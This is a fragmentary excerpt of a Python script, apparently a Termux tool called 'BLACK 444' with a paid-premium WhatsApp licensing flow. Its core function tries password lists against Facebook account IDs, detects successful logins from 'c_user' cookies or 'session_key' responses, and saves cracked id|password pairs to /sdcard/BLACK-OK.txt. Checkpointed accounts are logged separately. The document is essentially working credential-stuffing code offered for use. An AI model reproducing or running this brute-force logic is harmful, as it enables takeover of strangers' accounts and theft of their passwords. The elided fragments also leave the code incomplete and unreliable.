...
Y8888P' Y88888P YP   YP  `Y88P' YP   YD \033[1;31m4\033[1;32m4\033[1;33m4
\033[1;37m-------------------------------------------
 Author    : LY SOKHENG
 Facebook  : Ly Sokheng
 Github    : SokAlike
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://wa.me/+855963136010?text');menu()
                        elif xd in ['0','00']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+855963136010&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Aking Sir, I Need To Buy Your Paid BLACK 444 Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python BLACK.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [BLACK-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [BLACK-OK] %s | %s'%(ids,pas))
                                open('/sdcard/BLACK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [BLACK-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BLACK-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [BLACK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/BLACK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [BLACK-OK] '+uid+' | '+pas+'\033[1;97m')
